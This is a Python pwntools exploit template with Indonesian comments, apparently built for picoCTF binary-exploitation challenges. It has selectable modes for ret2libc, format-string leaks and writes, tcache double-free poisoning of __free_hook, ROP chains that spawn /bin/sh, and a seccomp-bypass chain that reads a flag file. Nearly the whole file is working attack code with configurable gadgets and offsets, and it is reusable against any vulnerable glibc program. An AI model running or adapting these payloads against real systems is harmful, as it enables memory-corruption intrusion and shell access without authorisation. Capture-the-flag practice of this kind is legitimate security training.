#!/usr/bin/env python3
# ============================================================
#  PWN  │  STAGE 2 - Exploit Template (Modular)
#  Usage: python3 stage2_exploit.py [mode]
#  Mode : ret2libc | fmtstr | heap | rop | seccomp |
#         fusion_fs_r2l | fusion_heap_rop | fusion_full
# ============================================================

from pwn import *
import sys, os

# ╔══════════════════════════════════════════════════════════╗
# ║                      CONFIG BLOCK                        ║
# ║            ← EDIT SEMUA YANG PERLU DI SINI →            ║
# ╠══════════════════════════════════════════════════════════╣

BINARY  = "./heapedit_local"
LIBC    = "./libc.so.6"   # "" jika tidak ada
LD      = "./ld.so"        # "" jika tidak ada

REMOTE = args.REMOTE
HOST    = "candy-mountain.picoctf.net"
PORT    = 61706

# ── Mode default jika tidak pakai argumen CLI ──
MODE    = "heap"
# pilihan: ret2libc | fmtstr | heap | rop | seccomp |
#          fusion_fs_r2l | fusion_heap_rop | fusion_full

# ── BOF / ROP ──────────────────────────────────────────────
OFFSET      = 0           # cyclic offset ke RIP/EIP
POP_RDI     = 0x0         # gadget pop rdi ; ret
POP_RSI     = 0x0         # gadget pop rsi ; ret
POP_RDX     = 0x0         # gadget pop rdx ; ret  (atau pop rdx ; pop r12 ; ret)
RET_GADGET  = 0x0         # gadget ret (stack alignment)
SYSCALL_RET = 0x0         # gadget syscall ; ret
LEAVE_RET   = 0x0         # gadget leave ; ret (stack pivot)

# ── Libc symbols (auto-fill jika LIBC tersedia) ─────────────
PUTS_PLT    = 0x0
PUTS_GOT    = 0x0
MAIN_ADDR   = 0x0
ONE_GADGET  = 0x0         # offset one_gadget di libc (0 = nonaktif)
SYSTEM_OFF  = 0x0         # libc offset system  (0 = auto)
BINSH_OFF   = 0x0         # libc offset /bin/sh (0 = auto)
PUTS_OFF    = 0x0         # libc offset puts    (0 = auto)

# ── Format String ───────────────────────────────────────────
FS_OFFSET       = 6       # index format arg di stack (cari dengan %p.%p...)
FS_LEAK_IDX     = 6       # index leak yang berguna (libc/pie/stack)
FS_LEAK_OFFSET  = 0x0     # offset dari leak ke libc base (sesuaikan manual)
FS_WRITE_TARGET = 0x0     # GOT addr untuk overwrite (0 = skip write phase)
FS_WRITE_VALUE  = 0x0     # value yang mau ditulis ke FS_WRITE_TARGET

# ── Heap ────────────────────────────────────────────────────
CHUNK_SIZE      = 0x20    # ukuran chunk (tanpa header)
TCACHE_TARGET   = 0x0     # target tcache poison (__free_hook / __malloc_hook / stdout)
UNSORTED_OFF    = 0x3ebca0  # offset main_arena+96 di libc (default libc 2.27)
# Sesuaikan UNSORTED_OFF dengan: libc.symbols["main_arena"] + 96

# Menu binary (heap challenge biasanya punya menu interaktif)
MENU_ALLOC  = b"1"        # pilihan malloc/alloc/add
MENU_FREE   = b"3"        # pilihan free/delete
MENU_SHOW   = b"2"        # pilihan print/show/view
MENU_EDIT   = b"4"        # pilihan edit/update
MENU_EXIT   = b"5"
PROMPT_SIZE = b"size"     # prompt input size
PROMPT_IDX  = b"index"    # prompt input index
PROMPT_DATA = b"data"     # prompt input data
PROMPT_MENU = b"choice"   # prompt menu

# ── Seccomp ORW ─────────────────────────────────────────────
FLAG_PATH   = b"/flag\x00"
FLAG_FD     = 3           # fd yang dibuka setelah open()

# ╚══════════════════════════════════════════════════════════╝

context.log_level = "info"
# context.terminal = ["tmux", "splitw", "-h"]  # ← uncomment jika pakai tmux GDB

elf  = ELF(BINARY, checksec=False)
libc = ELF(LIBC, checksec=False) if LIBC and os.path.exists(LIBC) else None

def get_io():
    if REMOTE:
        return remote(HOST, PORT)
    if LD and LIBC and os.path.exists(LD) and os.path.exists(LIBC):
        return process([LD, BINARY], env={"LD_PRELOAD": LIBC})
    return process(BINARY)

def auto_fill():
    """Auto-fill address dari ELF/libc jika belum di-set manual."""
    global PUTS_PLT, PUTS_GOT, MAIN_ADDR, SYSTEM_OFF, BINSH_OFF, PUTS_OFF
    global POP_RDI, RET_GADGET

    if PUTS_PLT == 0 and "puts" in elf.plt:
        PUTS_PLT = elf.plt["puts"]
    if PUTS_GOT == 0 and "puts" in elf.got:
        PUTS_GOT = elf.got["puts"]
    if MAIN_ADDR == 0:
        MAIN_ADDR = elf.symbols.get("main", elf.entry)

    if POP_RDI == 0:
        try:    POP_RDI = next(elf.search(asm("pop rdi; ret")))
        except: pass
    if RET_GADGET == 0:
        try:    RET_GADGET = next(elf.search(asm("ret")))
        except: pass

    if libc:
        if SYSTEM_OFF == 0: SYSTEM_OFF = libc.symbols.get("system", 0)
        if BINSH_OFF  == 0:
            try:    BINSH_OFF = next(libc.search(b"/bin/sh"))
            except: pass
        if PUTS_OFF   == 0: PUTS_OFF = libc.symbols.get("puts", 0)

# ─────────────────────────────────────────────────────────────
#  HEAP MENU HELPERS
# ─────────────────────────────────────────────────────────────
def h_malloc(io, size, data=b""):
    io.sendlineafter(PROMPT_MENU, MENU_ALLOC)
    io.sendlineafter(PROMPT_SIZE, str(size).encode())
    if data:
        io.sendlineafter(PROMPT_DATA, data)

def h_free(io, idx):
    io.sendlineafter(PROMPT_MENU, MENU_FREE)
    io.sendlineafter(PROMPT_IDX, str(idx).encode())

def h_show(io, idx):
    io.sendlineafter(PROMPT_MENU, MENU_SHOW)
    io.sendlineafter(PROMPT_IDX, str(idx).encode())
    return io.recvline()

def h_edit(io, idx, data):
    io.sendlineafter(PROMPT_MENU, MENU_EDIT)
    io.sendlineafter(PROMPT_IDX, str(idx).encode())
    io.sendlineafter(PROMPT_DATA, data)

# ─────────────────────────────────────────────────────────────
#  MODE: ret2libc
# ─────────────────────────────────────────────────────────────
def exploit_ret2libc(io):
    auto_fill()
    assert OFFSET,    "Set OFFSET!"
    assert PUTS_PLT,  "puts tidak ada di PLT"
    assert PUTS_GOT,  "puts tidak ada di GOT"
    assert POP_RDI,   "Gadget pop rdi tidak ditemukan"

    log.info("Phase 1: leak puts@libc")
    pad = b"A" * OFFSET
    p   = pad
    p  += p64(POP_RDI)
    p  += p64(PUTS_GOT)
    p  += p64(PUTS_PLT)
    p  += p64(MAIN_ADDR)

    io.sendlineafter(b":", p)       # ← sesuaikan prompt
    io.recvline()                    # ← skip line jika perlu

    leak = u64(io.recvline().strip().ljust(8, b"\x00"))
    log.success(f"puts @ {hex(leak)}")

    assert libc, "LIBC file diperlukan untuk kalkulasi base!"
    libc.address = leak - PUTS_OFF
    log.success(f"libc base @ {hex(libc.address)}")
    log.info(f"system @ {hex(libc.address + SYSTEM_OFF)}")

    log.info("Phase 2: shell")
    if ONE_GADGET:
        p2  = pad + p64(RET_GADGET) + p64(libc.address + ONE_GADGET)
    else:
        p2  = pad
        p2 += p64(RET_GADGET)       # stack alignment
        p2 += p64(POP_RDI)
        p2 += p64(libc.address + BINSH_OFF)
        p2 += p64(libc.address + SYSTEM_OFF)

    io.sendlineafter(b":", p2)      # ← sesuaikan prompt
    io.interactive()

# ─────────────────────────────────────────────────────────────
#  MODE: fmtstr (Format String)
# ─────────────────────────────────────────────────────────────
def exploit_fmtstr(io):
    log.info("Phase 1: leak via format string")
    probe = b" ".join(f"%{i}$p".encode() for i in range(1, 20))
    io.sendlineafter(b":", probe)   # ← sesuaikan prompt
    out = io.recvline().strip()
    log.info(f"Stack dump: {out}")

    # ── Ambil nilai dari index tertentu ──
    vals = out.split(b" ")
    try:
        leak = int(vals[FS_LEAK_IDX - 1], 16)
        log.success(f"leak[{FS_LEAK_IDX}] = {hex(leak)}")
    except:
        log.warning("Parsing leak gagal, sesuaikan FS_LEAK_IDX")
        leak = 0

    if libc and FS_LEAK_OFFSET and leak:
        libc.address = leak - FS_LEAK_OFFSET
        log.success(f"libc base @ {hex(libc.address)}")

    if elf.pie and FS_LEAK_OFFSET and leak:
        elf.address  = leak - FS_LEAK_OFFSET   # sesuaikan mana yang leak
        log.success(f"PIE base @ {hex(elf.address)}")

    # ── Arbitrary write via fmtstr_payload ──
    if FS_WRITE_TARGET and FS_WRITE_VALUE:
        target = FS_WRITE_TARGET
        value  = FS_WRITE_VALUE
        log.info(f"Phase 2: write {hex(value)} → {hex(target)}")
        payload = fmtstr_payload(FS_OFFSET, {target: value})
        io.sendlineafter(b":", payload)     # ← sesuaikan prompt

    io.interactive()

# ─────────────────────────────────────────────────────────────
#  MODE: heap (UAF + Tcache Poison)
# ─────────────────────────────────────────────────────────────
def exploit_heap(io):
    assert libc, "LIBC diperlukan!"

    log.info("Phase 1: leak libc via unsorted bin")
    # Allocate chunk besar (masuk unsorted bin saat free)
    h_malloc(io, 0x500, b"A" * 8)   # idx 0  ← masuk unsorted bin
    h_malloc(io, 0x20,  b"B" * 8)   # idx 1  ← guard dari top chunk
    h_free(io, 0)
    raw = h_show(io, 0)              # baca FD pointer = libc arena

    # Parse leak dari output (sesuaikan parsing ini)
    try:
        leak = u64(raw[:8].ljust(8, b"\x00"))
        libc.address = leak - UNSORTED_OFF
        log.success(f"libc leak @ {hex(leak)}")
        log.success(f"libc base @ {hex(libc.address)}")
    except Exception as e:
        log.warning(f"Parsing leak gagal: {e}. Sesuaikan parsing raw.")

    # ── Target overwrite ──
    target = TCACHE_TARGET or (libc.address + libc.symbols.get("__free_hook", 0))
    shell  = libc.address + SYSTEM_OFF
    log.info(f"Phase 2: tcache poison → write {hex(shell)} → {hex(target)}")

    # Tcache double free + poison (glibc < 2.29: no key check)
    h_malloc(io, CHUNK_SIZE, b"C" * 8)   # idx 2
    h_malloc(io, CHUNK_SIZE, b"D" * 8)   # idx 3
    h_free(io, 2)
    h_free(io, 3)
    h_free(io, 2)                          # double free

    h_malloc(io, CHUNK_SIZE, p64(target)) # poison FD
    h_malloc(io, CHUNK_SIZE, b"E" * 8)
    h_malloc(io, CHUNK_SIZE, b"E" * 8)
    h_malloc(io, CHUNK_SIZE, p64(shell))  # tulis ke target (__free_hook = system)

    log.info("Phase 3: trigger shell via free('/bin/sh')")
    h_malloc(io, CHUNK_SIZE, b"/bin/sh\x00")  # idx baru
    h_free(io, 8)                               # free → __free_hook(system)("/bin/sh")

    io.interactive()

# ─────────────────────────────────────────────────────────────
#  MODE: rop (ROP chain dengan pwntools ROP builder)
# ─────────────────────────────────────────────────────────────
def exploit_rop(io):
    auto_fill()
    assert OFFSET, "Set OFFSET!"
    assert libc,   "LIBC diperlukan!"

    log.info("Phase 1: ROP leak libc")
    rop1 = ROP(elf)
    rop1.puts(elf.got["puts"])
    rop1.call(MAIN_ADDR)

    io.sendlineafter(b":", b"A" * OFFSET + bytes(rop1))
    io.recvline()

    leak = u64(io.recvline().strip().ljust(8, b"\x00"))
    libc.address = leak - PUTS_OFF
    log.success(f"puts @ {hex(leak)} | libc base @ {hex(libc.address)}")

    log.info("Phase 2: ROP system shell")
    rop2 = ROP([elf, libc])
    rop2.raw(RET_GADGET)              # alignment
    rop2.system(libc.address + BINSH_OFF)

    io.sendlineafter(b":", b"A" * OFFSET + bytes(rop2))
    io.interactive()

# ─────────────────────────────────────────────────────────────
#  MODE: seccomp (ORW - open/read/write)
# ─────────────────────────────────────────────────────────────
def exploit_seccomp(io):
    auto_fill()
    assert OFFSET, "Set OFFSET!"
    assert libc,   "LIBC diperlukan untuk gadgets!"

    bss = elf.bss() + 0x200

    log.info("ORW chain: write flag path → open → read → write stdout")
    rop = ROP([elf, libc])

    # 1. Baca FLAG_PATH ke BSS
    rop.read(0, bss, len(FLAG_PATH))

    # 2. open(flag_path, O_RDONLY)
    if "open" in elf.plt:
        rop.call(elf.plt["open"], [bss, 0])
    elif libc:
        rop.call(libc.symbols["open"], [bss, 0])

    # 3. read(fd, bss+0x100, 0x50)
    rop.read(FLAG_FD, bss + 0x100, 0x50)

    # 4. write(stdout, bss+0x100, 0x50)
    rop.write(1, bss + 0x100, 0x50)

    payload = b"A" * OFFSET + bytes(rop)
    io.sendlineafter(b":", payload)
    io.send(FLAG_PATH)

    log.success("Flag:")
    io.interactive()

# ─────────────────────────────────────────────────────────────
#  FUSION: Format String → ret2libc
# ─────────────────────────────────────────────────────────────
def exploit_fusion_fs_r2l(io):
    """Leak libc via format string, lanjut ke ret2libc ROP."""
    log.info("[FUSION] Phase 1: leak libc via fmtstr")
    io.sendlineafter(b":", f"%{FS_LEAK_IDX}$p".encode())
    raw = io.recvline().strip()
    try:
        leak = int(raw, 16)
        assert libc and FS_LEAK_OFFSET, "Set FS_LEAK_OFFSET!"
        libc.address = leak - FS_LEAK_OFFSET
        log.success(f"leak @ {hex(leak)} | libc base @ {hex(libc.address)}")
    except Exception as e:
        log.error(f"Leak gagal: {e}"); return

    auto_fill()
    log.info("[FUSION] Phase 2: ret2libc")
    pad = b"A" * OFFSET
    p   = pad
    p  += p64(RET_GADGET)
    p  += p64(POP_RDI)
    p  += p64(libc.address + BINSH_OFF)
    p  += p64(libc.address + SYSTEM_OFF)
    io.sendlineafter(b":", p)
    io.interactive()

# ─────────────────────────────────────────────────────────────
#  FUSION: Heap leak libc → ROP
# ─────────────────────────────────────────────────────────────
def exploit_fusion_heap_rop(io):
    """Heap leak libc (unsorted bin), lanjut ROP shell."""
    log.info("[FUSION] Phase 1: heap libc leak")
    h_malloc(io, 0x500, b"A" * 8)
    h_malloc(io, 0x20,  b"B" * 8)
    h_free(io, 0)
    raw = h_show(io, 0)
    try:
        leak = u64(raw[:8].ljust(8, b"\x00"))
        libc.address = leak - UNSORTED_OFF
        log.success(f"libc base @ {hex(libc.address)}")
    except Exception as e:
        log.error(f"Leak parse gagal: {e}"); return

    log.info("[FUSION] Phase 2: ROP shell")
    auto_fill()
    pad = b"A" * OFFSET
    p   = pad + p64(RET_GADGET) + p64(POP_RDI)
    p  += p64(libc.address + BINSH_OFF)
    p  += p64(libc.address + SYSTEM_OFF)
    io.sendlineafter(b":", p)
    io.interactive()

# ─────────────────────────────────────────────────────────────
#  FUSION FULL: FmtStr + Heap + ROP + ORW (tiered)
# ─────────────────────────────────────────────────────────────
def exploit_fusion_full(io):
    """
    Skenario gabungan:
      1. Format string → leak PIE + canary + libc
      2. Heap tcache poison → overwrite __free_hook
      3. ROP + ORW untuk bypass seccomp
    Sesuaikan tiap phase dengan binary yang ada.
    """
    log.info("[FUSION FULL] Phase 1: fmtstr leak")
    # Probe stack
    probe = b"%7$p.%11$p.%15$p"         # sesuaikan index
    io.sendlineafter(b":", probe)
    parts = io.recvline().strip().split(b".")
    # parse canary, pie, libc dari parts
    # canary = int(parts[0], 16)
    # elf.address = int(parts[1], 16) - 0xNNN
    # libc.address = int(parts[2], 16) - 0xNNN

    log.info("[FUSION FULL] Phase 2: heap tcache poison")
    # ... (customize) ...

    log.info("[FUSION FULL] Phase 3: ROP ORW")
    exploit_seccomp(io)

# ─────────────────────────────────────────────────────────────
#  DISPATCHER
# ─────────────────────────────────────────────────────────────
MODES = {
    "ret2libc"        : exploit_ret2libc,
    "fmtstr"          : exploit_fmtstr,
    "heap"            : exploit_heap,
    "rop"             : exploit_rop,
    "seccomp"         : exploit_seccomp,
    "fusion_fs_r2l"   : exploit_fusion_fs_r2l,
    "fusion_heap_rop" : exploit_fusion_heap_rop,
    "fusion_full"     : exploit_fusion_full,
}

if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else MODE
    if mode not in MODES:
        log.error(f"Mode tidak valid!\nPilihan: {list(MODES.keys())}")
        sys.exit(1)

    log.info(f"Mode={mode} | Binary={BINARY} | Remote={REMOTE}")
    context.binary = elf

    io = get_io()
    try:
        MODES[mode](io)
    except KeyboardInterrupt:
        io.interactive()
    except Exception as e:
        log.exception(e)
        io.interactive()
